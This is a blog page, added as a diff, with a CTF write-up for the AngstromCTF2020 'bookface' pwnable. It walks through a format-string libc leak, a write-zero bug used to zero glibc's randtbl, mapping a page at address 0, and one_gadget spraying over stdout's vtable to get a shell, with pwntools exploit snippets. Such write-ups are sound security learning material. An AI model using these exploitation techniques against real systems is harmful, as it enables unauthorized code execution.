@@ -1,0 +1,282 @@
+<!DOCTYPE html>
+<html lang="en">
+    <head>
+        <meta charset="utf-8">
+        <meta name="viewport" content="width=device-width, initial-scale=1">
+        <meta name="robots" content="noodp" />
+        <meta http-equiv="X-UA-Compatible" content="IE=edge, chrome=1">
+        <title>AngstromCTF2020 - bookface writeup - Midas Blog</title><meta name="Description" content="Writeup for AngstromCTF2020 bookface challenge"><meta property="og:title" content="AngstromCTF2020 - bookface writeup" />
+<meta property="og:description" content="Writeup for AngstromCTF2020 bookface challenge" />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://lkmidas.github.io/posts/20200319-angstromctf2020-writeups/" />
+<meta property="og:image" content="https://lkmidas.github.io/images/avatar.png"/>
+<meta property="article:published_time" content="2020-03-19T19:56:49-07:00" />
+<meta property="article:modified_time" content="2020-03-19T19:56:49-07:00" />
+<meta name="twitter:card" content="summary_large_image"/>
+<meta name="twitter:image" content="https://lkmidas.github.io/images/avatar.png"/>
+
+<meta name="twitter:title" content="AngstromCTF2020 - bookface writeup"/>
+<meta name="twitter:description" content="Writeup for AngstromCTF2020 bookface challenge"/>
+<meta name="application-name" content="Midas Blog">
+<meta name="apple-mobile-web-app-title" content="Midas Blog"><link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" />
+        <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
+        <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="manifest" href="/site.webmanifest"><link rel="canonical" href="https://lkmidas.github.io/posts/20200319-angstromctf2020-writeups/" /><link rel="next" href="https://lkmidas.github.io/posts/20201012-isitdtuctf2020quals-writeups/" /><link rel="stylesheet" href="/lib/normalize/normalize.min.css"><link rel="stylesheet" href="/css/style.min.css"><link rel="stylesheet" href="/lib/fontawesome-free/all.min.css"><link rel="stylesheet" href="/lib/animate/animate.min.css"><script type="application/ld+json">
+    {
+        "@context": "http://schema.org",
+        "@type": "BlogPosting",
+        "headline": "AngstromCTF2020 - bookface writeup",
+        "inLanguage": "en",
+        "mainEntityOfPage": {
+            "@type": "WebPage",
+            "@id": "https:\/\/lkmidas.github.io\/posts\/20200319-angstromctf2020-writeups\/"
+        },"genre": "posts","wordcount":  1058 ,
+        "url": "https:\/\/lkmidas.github.io\/posts\/20200319-angstromctf2020-writeups\/","datePublished": "2020-03-19T19:56:49-07:00","dateModified": "2020-03-19T19:56:49-07:00","publisher": {
+            "@type": "Organization",
+            "name": "Midas"},"author": {
+                "@type": "Person",
+                "name": "Midas"
+            },"description": "Writeup for AngstromCTF2020 bookface challenge"
+    }
+    </script></head>
+    <body header-desktop="fixed" header-mobile="auto"><script type="text/javascript">(window.localStorage && localStorage.getItem('theme') ? localStorage.getItem('theme') === 'dark' : ('dark' === 'auto' ? window.matchMedia('(prefers-color-scheme: dark)').matches : 'dark' === 'dark')) && document.body.setAttribute('theme', 'dark');</script>
+
+        <div id="mask"></div><div class="wrapper"><header class="desktop" id="header-desktop">
+    <div class="header-wrapper">
+        <div class="header-title">
+            <a href="/" title="Midas Blog"><img
+        class="lazyload logo"
+        src="/svg/loading.min.svg"
+        data-src="/images/avatar.png"
+        data-srcset="/images/avatar.png, /images/avatar.png 1.5x, /images/avatar.png 2x"
+        data-sizes="auto"
+        alt="/images/avatar.png"
+        title="/images/avatar.png" /></a>
+        </div>
+        <div class="menu">
+            <div class="menu-inner"><a class="menu-item" href="/posts/"> Posts </a><a class="menu-item" href="/categories/"> Categories </a><a class="menu-item" href="/about/"> About </a><span class="menu-item delimiter"></span><a href="javascript:void(0);" class="menu-item theme-switch" title="Switch Theme">
+                    <i class="fas fa-adjust fa-fw"></i>
+                </a>
+            </div>
+        </div>
+    </div>
+</header><header class="mobile" id="header-mobile">
+    <div class="header-container">
+        <div class="header-wrapper">
+            <div class="header-title">
+                <a href="/" title="Midas Blog"><img
+        class="lazyload logo"
+        src="/svg/loading.min.svg"
+        data-src="/images/avatar.png"
+        data-srcset="/images/avatar.png, /images/avatar.png 1.5x, /images/avatar.png 2x"
+        data-sizes="auto"
+        alt="/images/avatar.png"
+        title="/images/avatar.png" /></a>
+            </div>
+            <div class="menu-toggle" id="menu-toggle-mobile">
+                <span></span><span></span><span></span>
+            </div>
+        </div>
+        <div class="menu" id="menu-mobile"><a class="menu-item" href="/posts/" title="">Posts</a><a class="menu-item" href="/categories/" title="">Categories</a><a class="menu-item" href="/about/" title="">About</a><a href="javascript:void(0);" class="menu-item theme-switch" title="Switch Theme">
+                <i class="fas fa-adjust fa-fw"></i>
+            </a></div>
+    </div>
+</header>
+<div class="search-dropdown desktop">
+    <div id="search-dropdown-desktop"></div>
+</div>
+<div class="search-dropdown mobile">
+    <div id="search-dropdown-mobile"></div>
+</div>
+<main class="main">
+                <div class="container"><div class="toc" id="toc-auto">
+            <h2 class="toc-title">Contents</h2>
+            <div class="toc-content" id="toc-content-auto"></div>
+        </div><article class="page single"><h1 class="single-title animated flipInX">AngstromCTF2020 - bookface writeup</h1><div class="post-meta">
+            <div class="post-meta-line"><span class="post-author"><a href="/" title="Author" rel=" author" class="author"><i class="fas fa-user-circle fa-fw"></i>Midas</a></span>&nbsp;<span class="post-category">included in <a href="/categories/writeups/"><i class="far fa-folder fa-fw"></i>writeups</a></span></div>
+            <div class="post-meta-line"><i class="far fa-calendar-alt fa-fw"></i>&nbsp;<time datetime="2020-03-19">2020-03-19</time>&nbsp;<i class="fas fa-pencil-alt fa-fw"></i>&nbsp;1058 words&nbsp;
+                <i class="far fa-clock fa-fw"></i>&nbsp;5 minutes&nbsp;</div>
+        </div><div class="details toc" id="toc-static"  kept="">
+                <div class="details-summary toc-title">
+                    <span>Contents</span>
+                    <span><i class="details-icon fas fa-angle-right"></i></span>
+                </div>
+                <div class="details-content toc-content" id="toc-content-static"><nav id="TableOfContents">
+  <ul>
+    <li><a href="#introduction">Introduction</a></li>
+    <li><a href="#analyzing-the-binary">Analyzing the binary</a></li>
+    <li><a href="#leaking-libc">Leaking libc</a></li>
+    <li><a href="#zeroing-out-randtbl">Zeroing out randtbl</a></li>
+    <li><a href="#one-gadget-spraying">One gadget spraying</a></li>
+    <li><a href="#appendix">Appendix</a></li>
+  </ul>
+</nav></div>
+            </div><div class="content" id="content"><div class="details admonition note open">
+        <div class="details-summary admonition-title">
+            <i class="icon fas fa-pencil-alt fa-fw"></i>Note<i class="details-icon fas fa-angle-right fa-fw"></i>
+        </div>
+        <div class="details-content">
+            <div class="admonition-content"><em>Use the table of contents on the right to navigate to the section that you are interested in.</em></div>
+        </div>
+    </div>
+<h2 id="introduction">Introduction</h2>
+<div class="details admonition info open">
+        <div class="details-summary admonition-title">
+            <i class="icon fas fa-info-circle fa-fw"></i>Challenge Info<i class="details-icon fas fa-angle-right fa-fw"></i>
+        </div>
+        <div class="details-content">
+            <div class="admonition-content"><ul>
+<li><strong>Given files:</strong> <a href="/posts/20200319-angstromctf2020-writeups/bookface.tar.gz" rel="">bookface.tar.gz</a>.</li>
+<li><strong>Category:</strong> Pwnable</li>
+<li><strong>Hints:</strong> <code>sysctl vm.mmap_min_addr=0</code> was run on the host system (more a reminder than a hint, because this line is already in the <code>Dockerfile</code>); Brute forcing is not required.</li>
+<li><strong>Summary:</strong> This challenge gives us a <code>Docker</code> environment for a simple program that implements a social media app. The libc version is 2.23. The exploit involves leaking from a format string bug, and RCE through a NULL pointer deference because the min address for <code>mmap()</code> is set to 0. We also have to play with glibc <code>rand()</code> to make <code>mmap()</code> returns the desired address.</li>
+</ul>
+</div>
+        </div>
+    </div>
+<div class="details admonition tip open">
+        <div class="details-summary admonition-title">
+            <i class="icon fas fa-lightbulb fa-fw"></i>TL;DR<i class="details-icon fas fa-angle-right fa-fw"></i>
+        </div>
+        <div class="details-content">
+            <div class="admonition-content"><ol>
+<li>Analyze the binary -&gt; find format string bug in the survey (but without <code>%n</code> capability), logic bug that sets arbitrary address as 0.</li>
+<li>Take the survey -&gt; leak <code>libc</code> address.</li>
+<li>Use arbitrary write to 0 -&gt; set the whole <code>randtbl</code> of <code>rand()</code> to 0.</li>
+<li>Login a gain to map a page at address 0 -&gt; spray <code>one_gadget</code> on it.</li>
+<li>Overwrite <code>_IO_file_jmp</code>of <code>stdout</code> to 0 -&gt; call <code>one_gadget</code> and get shell</li>
+</ol>
+</div>
+        </div>
+    </div>
+<h2 id="analyzing-the-binary">Analyzing the binary</h2>
+<p>This program is like a very simple social media app with the following functionalities:</p>
+<ul>
+<li>Login and add/remove friends.</li>
+<li>When logging in, you are asked for an ID. If it&rsquo;s a new ID, you will be asked for a name. If the ID already exist, it will be a relogin and you will be asked for a survey.</li>
+<li>After logging in, you have the options to: add a number of friends, remove a number of friends, remove your account, logout.</li>
+<li>For the survey, you will be asked to rate 4 aspects on a scale of 0 to 10. If you don&rsquo;t rate them all 10, you will have to rate again, and if you don&rsquo;t rate them all 10 in the second time, your friends will be set to 0.</li>
+</ul>
+<p>The first bug here is that in the survey, there is a format string bug, but the character <code>n</code> has been filtered out, so this can only be used for leaking:</p>
+<div class="highlight"><pre class="chroma"><code class="language-C" data-lang="C"><span class="k">if</span> <span class="p">(</span><span class="n">strchr</span><span class="p">(</span><span class="n">survey</span><span class="p">,</span> <span class="sc">&#39;n&#39;</span><span class="p">)</span> <span class="o">!=</span> <span class="nb">NULL</span><span class="p">)</span> <span class="p">{</span>
+    <span class="c1">//a bug bounty report said something about hacking and the letter n
+</span><span class="c1"></span>    <span class="n">puts</span><span class="p">(</span><span class="s">&#34;ERROR: HACKING DETECTED&#34;</span><span class="p">);</span>
+    <span class="n">puts</span><span class="p">(</span><span class="s">&#34;Exiting...&#34;</span><span class="p">);</span>
+    <span class="n">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
+<span class="p">}</span>
+<span class="k">if</span> <span class="p">(</span><span class="n">strcmp</span><span class="p">(</span><span class="n">survey</span><span class="p">,</span> <span class="s">&#34;10</span><span class="se">\n</span><span class="s">10</span><span class="se">\n</span><span class="s">10</span><span class="se">\n</span><span class="s">10</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">)</span> <span class="o">!=</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
+    <span class="n">puts</span><span class="p">(</span><span class="s">&#34;Those ratings don&#39;t seem quite right. Please review them and try again:&#34;</span><span class="p">);</span>
+    <span class="n">printf</span><span class="p">(</span><span class="n">survey</span><span class="p">);</span>
+    <span class="p">...</span>
+<span class="p">}</span>
+</code></pre></div><p>The next bug is in that the number of <code>friends</code> in the struct is defined as a pointer, but treated as a number in the add/remove friend options, and treated as a pointer again when the user&rsquo;s friend get set to 0 -&gt; we can write 0 to any arbitrary address:</p>
+<div class="highlight"><pre class="chroma"><code class="language-C" data-lang="C"><span class="k">struct</span> <span class="n">profile</span> <span class="p">{</span>
+	<span class="kt">char</span> <span class="n">name</span><span class="p">[</span><span class="mh">0x100</span><span class="p">];</span>
+	<span class="kt">long</span> <span class="kt">long</span> <span class="o">*</span><span class="n">friends</span><span class="p">;</span> <span class="c1">//some people have a lot of friends
+</span><span class="c1"></span><span class="p">};</span>
+<span class="p">...</span>
+<span class="k">if</span> <span class="p">(</span><span class="n">strcmp</span><span class="p">(</span><span class="n">survey</span><span class="p">,</span> <span class="s">&#34;10</span><span class="se">\n</span><span class="s">10</span><span class="se">\n</span><span class="s">10</span><span class="se">\n</span><span class="s">10</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">)</span> <span class="o">!=</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
+		<span class="n">puts</span><span class="p">(</span><span class="s">&#34;Our survey says... you don&#39;t seem very nice. I doubt you have any friends!&#34;</span><span class="p">);</span>
+		<span class="o">*</span><span class="p">(</span><span class="n">user</span><span class="o">-&gt;</span><span class="n">friends</span><span class="p">)</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+<span class="p">}</span>
+</code></pre></div><p>The final thing is in the <code>Dockerfile</code> and the hint itself: <code>sysctl vm.mmap_min_addr=0</code> was run on the host system. There is a reason why most real systems set this to 4096 instead of 0, and this is a vulnearability. This makes so that <code>mmap()</code> can return a page at address 0, making NULL pointer deferences valid.</p>
+<h2 id="leaking-libc">Leaking libc</h2>
+<p>Using the format string bug in the survey, we can easily leak libc&rsquo;s address through the 3rd parameter:</p>
+<div class="highlight"><pre class="chroma"><code class="language-python" data-lang="python"><span class="c1"># Leak libc through fmt</span>
+<span class="n">login</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="s2">&#34;a&#34;</span><span class="p">,</span> <span class="s2">&#34;10</span><span class="se">\n</span><span class="s2">10</span><span class="se">\n</span><span class="s2">10</span><span class="se">\n</span><span class="s2">10</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">,</span> <span class="s2">&#34;10</span><span class="se">\n</span><span class="s2">10</span><span class="se">\n</span><span class="s2">10</span><span class="se">\n</span><span class="s2">10</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">)</span>
+<span class="n">logout</span><span class="p">()</span>
+<span class="n">r</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s2">&#34;ID: &#34;</span><span class="p">,</span> <span class="s2">&#34;0&#34;</span><span class="p">)</span>
+<span class="n">r</span><span class="o">.</span><span class="n">sendafter</span><span class="p">(</span><span class="s2">&#34;Content: &#34;</span><span class="p">,</span> <span class="s2">&#34;%3$lx aaaaa</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">)</span>
+<span class="n">r</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s2">&#34;again:</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">)</span>
+<span class="n">libc_base</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">r</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">12</span><span class="p">),</span> <span class="mi">16</span><span class="p">)</span> <span class="o">-</span> <span class="mi">1012416</span>
+<span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s2">&#34;libc_base: &#34;</span> <span class="o">+</span> <span class="nb">hex</span><span class="p">(</span><span class="n">libc_base</span><span class="p">))</span>
+</code></pre></div><h2 id="zeroing-out-randtbl">Zeroing out randtbl</h2>
+<p>Because the only bug we are left with is a arbitrary write to 0 bug, it initially seems that we cannot do much with it. But since the min address for mapping pages is 0, I thought that we could try to somehow map a page there, and use the bug to overwrite a pointer somewhere in <code>libc</code> and defrencing that pointer, which would normally be a fault do to NULL pointer deference, is now valid.</p>
+<p>But first, the problem is how to map a page at address 0, the <code>user</code> struct is stored in a separate page mapped with <code>rand()</code>:</p>
+<div class="highlight"><pre class="chroma"><code class="language-C" data-lang="C"><span class="n">user</span> <span class="o">=</span> <span class="n">mmap</span><span class="p">(</span><span class="n">rand</span><span class="p">()</span><span class="o">&amp;</span><span class="mh">0xfffffffffffff000</span><span class="p">,</span> <span class="k">sizeof</span> <span class="p">(</span><span class="k">struct</span> <span class="n">profile</span><span class="p">),</span> <span class="n">PROT_READ</span><span class="o">|</span><span class="n">PROT_WRITE</span><span class="p">,</span> <span class="n">MAP_PRIVATE</span><span class="o">|</span><span class="n">MAP_ANONYMOUS</span><span class="o">|</span><span class="n">MAP_FIXED</span><span class="p">,</span> <span class="o">-</span><span class="mi">1</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
+</code></pre></div><p>Therefore, if somehow we can make <code>rand()</code> returns 0, we win. At first I tried to bruteforce it, but it doesn&rsquo;t end well on the remote server. Then i digged in to the source of <code>rand()</code>  to see if I could make anything works there. In short, this is how <code>rand()</code> works: in the writable region of libc, there is a table of random values called <code>randtbl</code>. When <code>rand()</code> is called, it takes 2 &ldquo;random&rdquo; numbers in <code>randtbl</code>, adds them together and returns it as the result, it also uses that result to update the current <code>randtbl</code>. So, if we keep overwriting entries in <code>randtbl</code> to 0, it will eventually make <code>rand()</code> always return 0. The code in libc is as follows:</p>
+<div class="highlight"><pre class="chroma"><code class="language-C" data-lang="C"><span class="kt">int</span>
+<span class="nf">__random_r</span> <span class="p">(</span><span class="k">struct</span> <span class="n">random_data</span> <span class="o">*</span><span class="n">buf</span><span class="p">,</span> <span class="n">int32_t</span> <span class="o">*</span><span class="n">result</span><span class="p">)</span>
+<span class="p">{</span>
+    <span class="p">...</span>
+    <span class="n">int32_t</span> <span class="o">*</span><span class="n">fptr</span> <span class="o">=</span> <span class="n">buf</span><span class="o">-&gt;</span><span class="n">fptr</span><span class="p">;</span>
+    <span class="n">int32_t</span> <span class="o">*</span><span class="n">rptr</span> <span class="o">=</span> <span class="n">buf</span><span class="o">-&gt;</span><span class="n">rptr</span><span class="p">;</span>
+    <span class="n">int32_t</span> <span class="o">*</span><span class="n">end_ptr</span> <span class="o">=</span> <span class="n">buf</span><span class="o">-&gt;</span><span class="n">end_ptr</span><span class="p">;</span>
+    <span class="n">uint32_t</span> <span class="n">val</span><span class="p">;</span>
+    <span class="n">val</span> <span class="o">=</span> <span class="o">*</span><span class="n">fptr</span> <span class="o">+=</span> <span class="p">(</span><span class="n">uint32_t</span><span class="p">)</span> <span class="o">*</span><span class="n">rptr</span><span class="p">;</span>
+    <span class="cm">/* Chucking least random bit.  */</span>
+    <span class="o">*</span><span class="n">result</span> <span class="o">=</span> <span class="n">val</span> <span class="o">&gt;&gt;</span> <span class="mi">1</span><span class="p">;</span>
+    <span class="o">++</span><span class="n">fptr</span><span class="p">;</span>
+    <span class="k">if</span> <span class="p">(</span><span class="n">fptr</span> <span class="o">&gt;=</span> <span class="n">end_ptr</span><span class="p">)</span>
+    <span class="p">{</span>
+        <span class="n">fptr</span> <span class="o">=</span> <span class="n">state</span><span class="p">;</span>
+        <span class="o">++</span><span class="n">rptr</span><span class="p">;</span>
+    <span class="p">}</span>
+    <span class="k">else</span>
+    <span class="p">{</span>
+        <span class="o">++</span><span class="n">rptr</span><span class="p">;</span>
+        <span class="k">if</span> <span class="p">(</span><span class="n">rptr</span> <span class="o">&gt;=</span> <span class="n">end_ptr</span><span class="p">)</span>
+            <span class="n">rptr</span> <span class="o">=</span> <span class="n">state</span><span class="p">;</span>
+    <span class="p">}</span>
+    <span class="n">buf</span><span class="o">-&gt;</span><span class="n">fptr</span> <span class="o">=</span> <span class="n">fptr</span><span class="p">;</span>
+    <span class="n">buf</span><span class="o">-&gt;</span><span class="n">rptr</span> <span class="o">=</span> <span class="n">rptr</span><span class="p">;</span>
+    <span class="p">...</span>
+<span class="p">}</span>
+</code></pre></div><p>And so I tried to do just that, and it succeeded:</p>
+<div class="highlight"><pre class="chroma"><code class="language-python" data-lang="python"><span class="c1"># Zero out rand_tbl</span>
+<span class="n">login</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="n">p64</span><span class="p">(</span><span class="n">one_gadget</span><span class="p">)</span><span class="o">*</span><span class="mi">32</span><span class="p">,</span> <span class="s2">&#34;10</span><span class="se">\n</span><span class="s2">10</span><span class="se">\n</span><span class="s2">10</span><span class="se">\n</span><span class="s2">10</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">,</span> <span class="s2">&#34;10</span><span class="se">\n</span><span class="s2">10</span><span class="se">\n</span><span class="s2">10</span><span class="se">\n</span><span class="s2">10</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">)</span>
+<span class="n">remove</span><span class="p">()</span>
+
+<span class="k">for</span> <span class="n">j</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">4</span><span class="p">):</span>
+    <span class="k">print</span> <span class="n">j</span>
+    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">9</span><span class="p">):</span>
+        <span class="k">print</span> <span class="nb">str</span><span class="p">(</span><span class="n">j</span><span class="p">)</span> <span class="o">+</span> <span class="s2">&#34;:&#34;</span> <span class="o">+</span> <span class="nb">str</span><span class="p">(</span><span class="n">i</span><span class="p">)</span>
+        <span class="n">set_zero</span><span class="p">(</span><span class="n">rand_tbl</span> <span class="o">+</span> <span class="mi">8</span><span class="o">*</span><span class="n">i</span><span class="p">)</span>
+</code></pre></div><h2 id="one-gadget-spraying">One gadget spraying</h2>
+<p>The next concern is what to do with the page that is mapped at address 0. We cannot put shellcode there because it is mapped as non-executable. Therefore, I thought of making it a fake <code>vtable</code> for a FILE structure, because this is libc version <code>2.23</code>, so there is no <code>vtable</code> validity check. So my plan was to spray a lot <code>one_gadgets</code> there, then overwrite the <code>vtable</code> pointer of <code>stdout</code>, which is <code>_IO_file_jmp</code>, to 0. This way, the next calls to any function on <code>stdout</code> will pop a shell.</p>
+<div class="highlight"><pre class="chroma"><code class="language-python" data-lang="python"><span class="c1"># Spray one gadget on page at address 0</span>
+<span class="n">login</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="n">p64</span><span class="p">(</span><span class="n">one_gadget</span><span class="p">)</span><span class="o">*</span><span class="mi">32</span><span class="p">,</span> <span class="s2">&#34;10</span><span class="se">\n</span><span class="s2">10</span><span class="se">\n</span><span class="s2">10</span><span class="se">\n</span><span class="s2">10</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">,</span> <span class="s2">&#34;10</span><span class="se">\n</span><span class="s2">10</span><span class="se">\n</span><span class="s2">10</span><span class="se">\n</span><span class="s2">10</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">)</span>
+<span class="n">add_friend</span><span class="p">(</span><span class="n">IO_file_jmp</span> <span class="o">/</span> <span class="mi">8</span><span class="p">)</span>
+<span class="n">logout</span><span class="p">()</span>
+
+<span class="n">login</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="n">p64</span><span class="p">(</span><span class="n">one_gadget</span><span class="p">)</span><span class="o">*</span><span class="mi">32</span><span class="p">,</span> <span class="s2">&#34;01</span><span class="se">\n</span><span class="s2">01</span><span class="se">\n</span><span class="s2">01</span><span class="se">\n</span><span class="s2">01</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">,</span> <span class="s2">&#34;01</span><span class="se">\n</span><span class="s2">01</span><span class="se">\n</span><span class="s2">01</span><span class="se">\n</span><span class="s2">01</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">)</span>
+</code></pre></div><h2 id="appendix">Appendix</h2>
+<p>The full exploit is <a href="/posts/20200319-angstromctf2020-writeups/a.py" rel="">a.py</a>.</p></div><div class="post-footer" id="post-footer">
+    <div class="post-info">
+        <div class="post-info-line">
+            <div class="post-info-mod">
+                <span>Updated on 2020-03-19</span>
+            </div>
+            <div class="post-info-license"></div>
+        </div>
+        <div class="post-info-line">
+            <div class="post-info-md"></div>
+            <div class="post-info-share">
+                <span></span>
+            </div>
+        </div>
+    </div>
+
+    <div class="post-info-more">
+        <section class="post-tags"></section>
+        <section>
+            <span><a href="javascript:void(0);" onclick="window.history.back();">Back</a></span>&nbsp;|&nbsp;<span><a href="/">Home</a></span>
+        </section>
+    </div>
+
+    <div class="post-nav">
+            <a href="/posts/20201012-isitdtuctf2020quals-writeups/" class="next" rel="next" title="ISITDTUCTF2020 Quals - rev02 writeup">ISITDTUCTF2020 Quals - rev02 writeup<i class="fas fa-angle-right fa-fw"></i></a></div>
+</div>
+</article></div>
+            </main><footer class="footer">
+        <div class="footer-container"><div class="footer-line">Powered by <a href="https://gohugo.io/" target="_blank" rel="noopener noreffer" title="Hugo 0.80.0">Hugo</a> | Theme - <a href="https://github.com/dillonzq/LoveIt" target="_blank" rel="noopener noreffer" title="LoveIt 0.2.10"><i class="far fa-kiss-wink-heart fa-fw"></i> LoveIt</a>
+                </div><div class="footer-line"><i class="far fa-copyright fa-fw"></i><span itemprop="copyrightYear">2021</span><span class="author" itemprop="copyrightHolder">&nbsp;<a href="/" target="_blank"></a></span></div>
+        </div>
+    </footer></div>
+
+        <div id="fixed-buttons"><a href="#" id="back-to-top" class="fixed-button" title="Back to Top">
+                <i class="fas fa-arrow-up fa-fw"></i>
+            </a><a href="#" id="view-comments" class="fixed-button" title="View Comments">
+                <i class="fas fa-comment fa-fw"></i>
+            </a>
+        </div><script type="text/javascript" src="/lib/smooth-scroll/smooth-scroll.min.js"></script><script type="text/javascript" src="/lib/lazysizes/lazysizes.min.js"></script><script type="text/javascript" src="/lib/clipboard/clipboard.min.js"></script><script type="text/javascript">window.config={"code":{"copyTitle":"Copy to clipboard","maxShownLines":60},"comment":{}};</script><script type="text/javascript" src="/js/theme.min.js"></script></body>
+</html>
